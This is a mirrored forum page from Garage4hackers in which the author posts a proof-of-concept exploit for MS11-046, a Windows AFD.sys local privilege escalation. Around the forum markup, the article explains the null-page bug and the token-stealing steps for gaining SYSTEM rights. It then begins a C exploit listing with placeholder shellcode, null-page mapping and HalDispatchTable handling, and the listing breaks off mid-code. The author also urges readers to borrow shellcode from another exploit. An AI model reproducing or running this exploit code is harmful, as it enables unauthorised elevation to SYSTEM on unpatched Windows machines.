<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en">

<!-- Mirrored from garage4hackers.com/content.php?r=118-MS11-046-exploit-Code-Windows-local-Privilege-Escalation by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 10:48:53 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta id="e_vb_meta_bburl" name="vb_meta_bburl" content="index.html" />
<base  /><!--[if IE]></base><![endif]-->
<meta name="generator" content="vBulletin 4.2.1" />
<meta http-equiv="X-UA-Compatible" content="IE=9" />

	<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />


		<meta name="keywords" content="MS11-046" />
		<meta name="description" content="MS11-046 exploit Code, Windows local Privilege Escalation ." />



	<meta property="fb:app_id" content="170793809601191" />
<meta property="og:site_name" content="Garage4hackers Forum" />
<meta property="og:description" content="MS11-046 exploit Code, Windows local Privilege Escalation ." />
<meta property="og:url" content="contentb0dd.html?r=118-MS11-046-exploit-Code-Windows-local-Privilege-Escalation" />
<meta property="og:type" content="article" />




	
		<script type="text/javascript" src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js"></script>
	

<script type="text/javascript">
<!--
	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
	{
		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
		var yuipath = 'clientscript/yui';
		var yuicombopath = '';
		var remoteyui = false;
	}
	else	// Load Rest of YUI remotely (where possible)
	{
		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
		var remoteyui = true;
		if (!yuicombopath)
		{
			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
		}
	}
	var SESSIONURL = "";
	var SECURITYTOKEN = "guest";
	var IMGDIR_MISC = "images/misc";
	var IMGDIR_BUTTON = "images/buttons";
	var vb_disable_ajax = parseInt("0", 10);
	var SIMPLEVERSION = "421";
	var BBURL = "index.html";
	var LOGGEDIN = 0 > 0 ? true : false;
	var THIS_SCRIPT = "vbcms";
	var RELPATH = "contentb0dd.html?r=118-MS11-046-exploit-Code-Windows-local-Privilege-Escalation";
	var PATHS = {
		forum : "",
		cms   : "",
		blog  : ""
	};
	var AJAXBASEURL = "index.html";
// -->
</script>
<script type="text/javascript" src="clientscript/vbulletin-core6719.js?v=421"></script>



	<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum RSS Feed" href="external9476.php?type=RSS2" />
	



	<link rel="stylesheet" type="text/css" href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," />

	<!--[if lt IE 8]>
	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
	<![endif]-->


    
        <link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum - CMS RSS Feed" href="externalbc09.php?do=rss&amp;type=newcontent&amp;sectionid=1&amp;days=120&amp;count=10" />
    
    <title>Garage4hackers Forum - MS11-046 exploit Code, Windows local Privilege Escalation .</title>
	
		<link rel="stylesheet" type="text/css" href="css6862.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=widgets.css,vbcms.css,postbit-lite.css,postlist.css,lightbox.css,overlay.css,tagcloud.css," />
	
    <!--[if lt IE 8]>
        <link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=vbcms-ie.css,postbit-lite-ie.css,postlist-ie.css" />
    <![endif]-->
    <!--[if lt IE 7]>
	<script type="text/javascript">
		window.LESS_THAN_IE7 = true;
	</script>
    <![endif]-->
	<script type="text/javascript" src="clientscript/vbulletin_overlay6719.html?v=421"></script>
	<script type="text/javascript" src="clientscript/vbulletin_cms6719.html?v=421"></script>
	<script type="text/javascript" src="clientscript/vbulletin_ajax_htmlloader6719.js?v=421">
    </script>
    <link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />

</head>
<body style="text-align:left">
<div class="above_body"> <!-- closing tag is in template navbar -->
<div id="header" class="floatcontainer doc_header">
	<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
	<div id="toplinks" class="toplinks">
		
			<ul class="nouser">
			
				<li><a href="register.html" rel="nofollow">Register</a></li>
			
				<li><a rel="help" href="faq.html">Help</a></li>
				<li>
			<script type="text/javascript" src="clientscript/vbulletin_md56719.html?v=421"></script>
			<form id="navbar_loginform" action="../external.html?link=http://garage4hackers.com/login.php?do=login" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
				<fieldset id="logindetails" class="logindetails">
					<div>
						<div>
					<input type="text" class="textbox default-value" name="vb_login_username" id="navbar_username" size="10" accesskey="u" tabindex="101" value="User Name" />
					<input type="password" class="textbox" tabindex="102" name="vb_login_password" id="navbar_password" size="10" />
					<input type="text" class="textbox default-value" tabindex="102" name="vb_login_password_hint" id="navbar_password_hint" size="10" value="Password" style="display:none;" />
					<input type="submit" class="loginbutton" tabindex="104" value="Log in" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." accesskey="s" />
						</div>
					</div>
				</fieldset>
				<div id="remember" class="remember">
					<label for="cb_cookieuser_navbar"><input type="checkbox" name="cookieuser" value="1" id="cb_cookieuser_navbar" class="cb_cookieuser_navbar" accesskey="c" tabindex="103" /> Remember Me?</label>
				</div>

				<input type="hidden" name="s" value="" />
				<input type="hidden" name="securitytoken" value="guest" />
				<input type="hidden" name="do" value="login" />
				<input type="hidden" name="vb_login_md5password" />
				<input type="hidden" name="vb_login_md5password_utf" />
			</form>
			<script type="text/javascript">
			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
			vB_XHTML_Ready.subscribe(function()
			{
			//
				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
			});
			
			function navbar_username_focus(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == 'User Name')
				{
				//
					textbox.value='';
					textbox.style.color='#000000';
				}
			}

			function navbar_username_blur(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == '')
				{
				//
					textbox.value='User Name';
					textbox.style.color='#777777';
				}
			}
			
			function navbar_password_hint(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
				YAHOO.util.Dom.get('navbar_password').focus();
			}

			function navbar_password(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				if (textbox.value == '')
				{
					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
				}
			}
			</script>
				</li>
				
					<li id="fb_headerbox" class="hidden">

	<a id="fb_loginbtn" href="#"><img src="images/misc/facebook_login.html" alt="The Facebook Platform" /></a>

</li>

				
			</ul>
		
	</div>
	<div class="ad_global_header">
		 
		 
	</div>
	<hr />
</div>
<div id="navbar" class="navbar">
	<ul id="navtabs" class="navtabs floatcontainer">
		
		
	
		<li  id="vbtab_whatsnew">
			<a class="navtab" href="activity.html">What's New?</a>
		</li>
		
		

	
		<li class="selected" id="vbtab_cms">
			<a class="navtab" href="content.html">Articles</a>
		</li>
		
		
			<ul class="floatcontainer">
				
					
						
							<li id=""><a href="content5ee7.html?r=1-home">Home</a></li>
						
					
				
			</ul>
		

	
		<li  id="vbtab_forum">
			<a class="navtab" href="forum.html">Forum</a>
		</li>
		
		

	
		<li  id="vbtab_blog">
			<a class="navtab" href="blog.html">Blogs</a>
		</li>
		
		

	
		<li  id="tab_nja4_357">
			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
		</li>
		
		

	
		<li  id="tab_nta0_579">
			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
		</li>
		
		

	
		<li  id="tab_nta0_442">
			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
		</li>
		
		

		<li>
            <a class="navtab" href="pages.html">Events and Conferences</a></li>
	</ul>
	
		<div id="globalsearch" class="globalsearch">
			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" method="post" id="navbar_search" class="navbar_search">
				
				<input type="hidden" name="securitytoken" value="guest" />
				<input type="hidden" name="do" value="process" />
				<span class="textboxcontainer"><span><input type="text" value="" name="query" class="textbox" tabindex="99"/></span></span>
				<span class="buttoncontainer"><span><input type="image" class="searchbutton" src="images/buttons/search.html" name="submit" onclick="document.getElementById('navbar_search').submit;" tabindex="100"/></span></span>
			</form>
			<ul class="navbar_advanced_search">
				<li><a href="search.html" accesskey="4">Advanced Search</a></li>
				
			</ul>
		</div>
	
</div>
</div><!-- closing div for above_body -->

<div class="body_wrapper">
<div id="breadcrumb" class="breadcrumb">
	<ul class="floatcontainer">
		<li class="navbithome"><a href="content.html" accesskey="1"><img src="images/misc/navbit-home.html" alt="Home" /></a></li>
		
	<li class="navbit"><a href="content.html">Home</a></li>

	<li class="navbit"><a href="contentc520.html?r=163-exploitation-techniques">Exploitation Techniques</a></li>

		
	<li class="navbit lastnavbit"><span>MS11-046 exploit Code, Windows local Privilege Escalation .</span></li>

	</ul>
	<hr />
</div>


<div style="width:728px; margin:0 auto; padding-bottom:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 728;
google_ad_height = 15;
google_ad_format = "728x15_0ads_al_s";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script type="text/javascript"
  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div>

<div id="ad_global_below_navbar"><script async src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- garage1 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-6847984837250662"
     data-ad-slot="4036513682"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></div>


	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" method="post" id="notices" class="notices">
		<input type="hidden" name="do" value="dismissnotice" />
		<input type="hidden" name="s" value="" />
		<input type="hidden" name="securitytoken" value="guest" />
		<input type="hidden" id="dismiss_notice_hidden" name="dismiss_noticeid" value="" />
		<input type="hidden" name="url" value="" />
		<ol>
			<li class="restore" id="navbar_notice_2">
	
	<html>
<h2>
The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 


</h2>

<!-- Mirrored from garage4hackers.com/content.php?r=118-MS11-046-exploit-Code-Windows-local-Privilege-Escalation by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 10:48:53 GMT -->
</html>
</li>
		</ol>
	</form>



<div class="vbcms_content">
<div id="doc3" class="yui-tvb-r3">
	<div id="bd">
		<div id="yui-main">
			<div class="yui-b">
				<div class="yui-gf">
					<div class="yui-u first yui-panel">
						<ul class="list_no_decoration widget_list" id="widgetlist_column1">
<li><script type="text/javascript">
<!--
	var IMGDIR_MISC = "images/misc";
	var vb_disable_ajax = parseInt("0", 10);

        /* Start Sections Widget Configuration */
        vbGlobal_SHOW_ALL_TREE_ELEMENTS_THRESHOLD = parseInt("5");
        /* End Seections Widget Configuration */
// -->
</script>
<script type="text/javascript">
<!--
	document.write('<script type="text/javascript" src="' + yuipath + '/treeview/treeview-min.js"></script>');
	loadVbCss(yuipath + '/treeview/assets/skins/sam/treeview.css');
//-->
</script>
<!-- end treeview css -->

<!-- custom treeview styles defined at template: headinclude -->

<!-- END VB Tree-Menu Implementation of YUI TreeView -->
<div class="cms_widget">
	<div class="block">
		<div class="cms_widget_header">
			<h3><img src="images/cms/sections.html" alt="" /> Menu</h3>
		</div>
		<div class="cms_widget_content widget_content">
			<div class="vb-tree-menu">
				<ul >
<li><a href="contentfbb6.html?r=5-g4h-tutorial-and-research-papers" title="G4H Tutorial and Papers">G4H Tutorial and Papers</a>
</li>
<li><a href="content842d.html?r=4-g4h-tools-and-scripts" title="G4H Tools and Scripts">G4H Tools and Scripts</a>
</li>
<li><a href="content8f5d.html?r=2-garage4hackers-exploits" title="G4H Exploits">G4H Exploits</a>
</li>
<li><a href="content7820.html?r=107-ctf-amp-meet-writeups" title="CTF &amp; Meet Writeups">CTF &amp; Meet Writeups</a>
</li>
<li><a href="content0b4f.html?r=128-google-vulnerabilities" title="Google Hall of Fame">Google Hall of Fame</a>
</li>
<li><a href="contentf20a.html?r=134-teensy" title="Teensy">Teensy</a>
</li>
<li><a href="content93b9.html?r=136-webapp-exploits" title="Bug Bounty Listing">Bug Bounty Listing</a>
</li>
<li><a href="contentdb2e.html?r=151-web-application-security" title="Web Application Security">Web Application Security</a>
</li>
<li><a href="contentc520.html?r=163-exploitation-techniques" title="Exploitation Techniques">Exploitation Techniques</a>
</li>
<li><a href="content90cc.html?r=172-ranchoddas-webcast-recording" title="RWS Webcast Recording">RWS Webcast Recording</a>
</li>
<li><a href="contente989.html?r=179-blogs" title="Blogs">Blogs</a>
</li></ul>
 
			</div>
				<noscript>
					<div class="cms_widget_sectionnav">
						<div class="cms_widget_sectionnav_page">
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="contentfbb6.html?r=5-g4h-tutorial-and-research-papers">G4H Tutorial and Papers</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content842d.html?r=4-g4h-tools-and-scripts">G4H Tools and Scripts</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content8f5d.html?r=2-garage4hackers-exploits">G4H Exploits</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content7820.html?r=107-ctf-amp-meet-writeups">CTF &amp; Meet Writeups</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content0b4f.html?r=128-google-vulnerabilities">Google Hall of Fame</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="contentf20a.html?r=134-teensy">Teensy</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content93b9.html?r=136-webapp-exploits">Bug Bounty Listing</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="contentdb2e.html?r=151-web-application-security">Web Application Security</a></div>
							
								
									<div class="active_menuitem" style="text-indent:20px">
								
								<a href="contentc520.html?r=163-exploitation-techniques">Exploitation Techniques</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content90cc.html?r=172-ranchoddas-webcast-recording">RWS Webcast Recording</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="contente989.html?r=179-blogs">Blogs</a></div>
							
						</div>
					</div>
				</noscript>			
		</div>
	</div>
</div>

<script type="text/javascript">
	initVbTreeMenus(false);
</script></li>
</ul>
					</div>
					<div class="yui-u yui-panel">
						<ul class="list_no_decoration widget_list" id="widgetlist_column2">
<li><!-- styles defined in template: headinclude -->



<div class="article_width" id="article_content">
	<div class="title">
                <h1 class="article_title cms_article_title"><span>MS11-046 exploit Code, Windows local Privilege Escalation .</span>
                        
		</h1>
	</div>
	<div class="article_author_date_comment_container">
                
		<div class="fullwidth">
			
				<div>
<fb:like href="contentb0dd.html?r=118-MS11-046-exploit-Code-Windows-local-Privilege-Escalation" font="tahoma" layout="standard" show_faces="false" width="260" action="../external.html?link=http://garage4hackers.com/like" colorscheme="light"></fb:like></div>
			
			
				<div class="article_username_container">
					by <div class="popupmenu memberaction">
	<a class="username offline popupctrl" href="membere81f.html?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>
	<ul class="popupbody popuphover memberaction_body">
		<li class="left">
			<a href="membere81f.html?u=8" class="siteicon_profile">
				View Profile
			</a>
		</li>
		
		<li class="right">
			<a href="search9898.html?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
				View Forum Posts
			</a>
		</li>
		
		
		<li class="left">
			<a href="privatedce0.html?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">
				Private Message
			</a>
		</li>
		
		
		
		<li class="right">
			<a href="bloge81f.html?u=8" class="siteicon_blog" rel="nofollow">
				View Blog Entries
			</a>
		</li>
		
		
		
		<li class="left">
			<a href="index.html" class="siteicon_homepage">
				Visit Homepage
			</a>
		</li>
		
		
		
		<li class="right">
			<a href="list2c25.html?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">
				View Articles
			</a>
		</li>
		

		

		
		
	</ul>
</div>
				</div>
			
                        
                                <div class="article_rating_container">
                                        <div class="popupmenu cmsratingmenu" id="cmsrating">
                                                <h6><a class="popupctrl" href="javascript://" id="cmsrating_current">Rate this article</a></h6>
                                                <form action="../external.html?link=http://garage4hackers.com/content.php?118/rate" method="post" id='cms_cmsrate_form'>
                                                        <ul class="popupbody popuphover">
                                                                
                                                                        <li><label for="r5"><span class="rating5 cmsrating right">
                                                                                <input type="radio" name="vote" value="5" id="r5"  tabindex="1" /> Excellent
                                                                        </span></label></li>
                                                                        <li><label for="r4"><span class="rating4 cmsrating right">
                                                                                <input type="radio" name="vote" value="4" id="r4"  tabindex="1" /> Good
                                                                        </span></label></li>
                                                                        <li><label for="r3"><span class="rating3 cmsrating right">
                                                                                <input type="radio" name="vote" value="3" id="r3"  tabindex="1" /> Average
                                                                        </span></label></li>
                                                                        <li><label for="r2"><span class="rating2 cmsrating right">
                                                                                <input type="radio" name="vote" value="2" id="r2"  tabindex="1" /> Bad
                                                                        </span></label></li>
                                                                        <li><label for="r1"><span class="rating1 cmsrating right">
                                                                                <input type="radio" name="vote" value="1" id="r1"  tabindex="1" /> Terrible
                                                                        </span></label></li>
                                                                        <li class="formsubmit"><input type="submit" class="button" value="Vote Now" tabindex="1" /></li>
                                                                
                                                        </ul>
                                                        <input type="hidden" name="s" value="" />
                                                        <input type="hidden" name="securitytoken" value="guest" />
                                                </form>
                                                <script type="text/javascript" src="clientscript/cms_ajax_rate6719.html?v=421"></script>
                                                <script type="text/javascript">
                                                <!--
                                                        var nodeid = 118;
                                                        vB_AJAX_CMSRate_Init('cms_cmsrate_form');
                                                //-->
                                                </script>
                                        </div>
                                </div>
                        
                        <div class="cms_clear"></div>
                        
				<div class=" article_username_container ">
					
						
							Published on 04-08-2012  05:35 PM
						
					
					
						&nbsp;
						&nbsp;
					
					
						&nbsp;Number of Views: 4572
						&nbsp;
					
				</div>
			
                       
                        <div class="article_rating_container">
                            	<a href="contentb0dd.html?r=118-MS11-046-exploit-Code-Windows-local-Privilege-Escalation#comments"  rel="nofollow"><span id="comments_top_count">0</span> <span id="comments_top_text"> Comments</span></a>
				<img src="images/misc/comment.html" alt="Comments" border="0" />
                        </div>
                       
		</div>
	</div>
    
    <div class="clear"></div>
	<div class="article cms_clear restore postcontainer">Windows not sure about Win 7 lets Mapping of 0x00000000 in user space, and this particular vulnerability windows fix [Ms011-46] was by adding a simple check for Null Pntr  in the AFD.sys, which I find odd, so I assume Win 7 it would be possible too[#assuming ] .<br />
<br />
There was no POC exploit available, so I just made a quick POC, well things were clear form Ronnie's article so nothing big .<br />
<br />
<br />
<br />
MS11-046 Exploit Code by fb1h2s<br />
<br />
MS11-046 Was a Zero day found in the wild , reported to MS by<br />
<br />
Steven Adair from the Shadowserver Foundation and Chris S .<br />
<a href="../external.html?link=http://technet.microsoft.com/en-us/security/bulletin/ms11-046" target="_blank">Microsoft Security Bulletin MS11-046 - Important : Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2503665)</a><br />
<br />
Ronnie Johndas wrote the writeup dissecting a malware with this exploit .<br />
<a href="../www.exploit-db.com/wp-content/themes/exploit/docs/18712.html" target="_blank">http://www.exploit-db.com/wp-content...docs/18712.pdf</a><br />
<br />
I Rahul Sasi(fb1h2s) just made the POC exploit available .<br />
<a href="index.html" target="_blank">Garage4hackers Forum - Home</a><br />
<a href="../external.html?link=http://twitter.com/#%21/fb1h2s" target="_blank">Twitter</a><br />
<br />
Reference: ms8-66, ms6-49 exp codes<br />
<br />
**************************************************  ***********<br />
Too lazy to add the shellcode , you could steel this one, it should work .<br />
<br />
<a href="../external.html?link=http://www.whitecell.org/list.php?id=50" target="_blank">Symantec Local Privilege Escalation Vulnerability Exploit</a><br />
<br />
The shell code to acheive privilage esclation as per the article  used the following steps<br />
<br />
<a href="../www.exploit-db.com/wp-content/themes/exploit/docs/18712.html" target="_blank">http://www.exploit-db.com/wp-content...docs/18712.pdf</a><br />
 .<br />
<br />
 1) Use PslookupProcessId get system token<br />
 2) Replace it with the current process token, and we are system<br />
<br />
<br />
**************************************************  ***********<br />
<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #007700">*/<br /><br /></span><span style="color: #FF8000">#define&nbsp;SystemModuleInformation&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11<br />#ifndef&nbsp;WIN32_LEAN_AND_MEAN<br />#define&nbsp;WIN32_LEAN_AND_MEAN<br />#endif<br />#ifndef&nbsp;_WIN32_WINNT<br />//For&nbsp;XP&nbsp;Only<br />#define&nbsp;_WIN32_WINNT&nbsp;0x0501<br />#endif<br />//&nbsp;We&nbsp;have&nbsp;a&nbsp;client&nbsp;sock&nbsp;conencting&nbsp;to&nbsp;135&nbsp;considering&nbsp;the&nbsp;fact&nbsp;it's&nbsp;open&nbsp;by&nbsp;default<br />#define&nbsp;DEFAULT_ADDR&nbsp;"127.0.0.1"<br />#define&nbsp;DEFAULT_PORT&nbsp;"135"<br /><br />#include&nbsp;&lt;windows.h&gt;<br />#include&nbsp;&lt;winsock2.h&gt;<br />#include&nbsp;&lt;ws2tcpip.h&gt;<br />#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;iphlpapi.h&gt;<br />#include&nbsp;&lt;stdio.h&gt;<br /><br />#pragma&nbsp;comment(lib,&nbsp;"Ws2_32.lib")<br />#pragma&nbsp;comment&nbsp;(lib,&nbsp;"ntdll.lib")<br /><br /><br />//lets&nbsp;make&nbsp;a&nbsp;nop&nbsp;ret&nbsp;sandwitch<br /></span><span style="color: #0000BB">unsigned&nbsp;char&nbsp;hexcode</span><span style="color: #007700">&#91;&#93;=</span><span style="color: #DD0000">"\x90\x90\x90\xcc\x90\x90\x90\x90"</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">/*<br />The&nbsp;shell&nbsp;code&nbsp;to&nbsp;acheive&nbsp;privilage&nbsp;esclation<br /><br />Add&nbsp;you&nbsp;shellcode&nbsp;here&nbsp;as&nbsp;per&nbsp;the&nbsp;article&nbsp;http://www.exploit-db.com/wp-content/themes/exploit/docs/18712.pdf<br />&nbsp;the&nbsp;malware&nbsp;used&nbsp;the&nbsp;following&nbsp;method.<br /><br />&nbsp;1)&nbsp;Wse&nbsp;PslookupProcessId&nbsp;get&nbsp;system&nbsp;token<br />&nbsp;2)&nbsp;Replace&nbsp;it&nbsp;with&nbsp;the&nbsp;current&nbsp;process&nbsp;token,&nbsp;and&nbsp;we&nbsp;are&nbsp;system<br /><br />*/<br /><br />//&nbsp;he&nbsp;gets&nbsp;the&nbsp;above&nbsp;sandwitch<br />&nbsp;</span><span style="color: #0000BB">LPVOID&nbsp;hexcode_addr&nbsp;</span><span style="color: #007700">=&nbsp;(</span><span style="color: #0000BB">LPVOID</span><span style="color: #007700">)</span><span style="color: #0000BB">0x00000000</span><span style="color: #007700">;<br /><br />&nbsp;</span><span style="color: #0000BB">DWORD&nbsp;sizeofshell&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0x1000</span><span style="color: #007700">;<br /></span><span style="color: #FF8000">//&nbsp;he&nbsp;gets&nbsp;the&nbsp;haldispatch<br /><br />&nbsp;</span><span style="color: #0000BB">ULONG_PTR&nbsp;HalDispatchTable</span><span style="color: #007700">;<br /><br />&nbsp;</span><span style="color: #FF8000">//Holds&nbsp;the&nbsp;base&nbsp;adress&nbsp;of&nbsp;krnl<br /><br /></span><span style="color: #0000BB">PVOID&nbsp;&nbsp;krl_base</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">//load&nbsp;adress&nbsp;of&nbsp;those&nbsp;%krnl%.exe&nbsp;dudes<br /></span><span style="color: #0000BB">HMODULE&nbsp;krl_addr</span><span style="color: #007700">;<br /><br /><br /><br /></span><span style="color: #FF8000">//&nbsp;structure&nbsp;system_module_info&nbsp;data<br /><br /></span><span style="color: #0000BB">typedef&nbsp;struct&nbsp;_SYSTEM_MODULE_INFORMATION&nbsp;</span><span style="color: #007700">{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ULONG&nbsp;&nbsp;Reserved</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">2</span><span style="color: #007700">&#93;;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">PVOID&nbsp;&nbsp;Base</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ULONG&nbsp;&nbsp;Size</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ULONG&nbsp;&nbsp;Flags</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">USHORT&nbsp;Index</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">USHORT&nbsp;Unknown</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">USHORT&nbsp;LoadCount</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">USHORT&nbsp;ModuleNameOffset</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">CHAR&nbsp;&nbsp;&nbsp;ImageName</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">256</span><span style="color: #007700">&#93;;<br />}&nbsp;</span><span style="color: #0000BB">SYSTEM_MODULE_INFORMATION</span><span style="color: #007700">,&nbsp;*</span><span style="color: #0000BB">PSYSTEM_MODULE_INFORMATION</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">//sock&nbsp;addrinfo<br /></span><span style="color: #0000BB">struct&nbsp;addrinfo&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">result&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">NULL</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*</span><span style="color: #0000BB">ptr&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">NULL</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">hints</span><span style="color: #007700">;<br /><br /><br /></span><span style="color: #FF8000">//&nbsp;The&nbsp;list&nbsp;of&nbsp;loaded&nbsp;drivers<br /></span><span style="color: #0000BB">typedef&nbsp;LONG&nbsp;NTSTATUS</span><span style="color: #007700">,&nbsp;*</span><span style="color: #0000BB">PNTSTATUS</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">NTSTATUS<br />NTAPI<br />ZwQuerySystemInformation</span><span style="color: #007700">(<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">IN&nbsp;ULONG&nbsp;SystemInformationClass</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">IN&nbsp;PVOID&nbsp;SystemInformation</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: 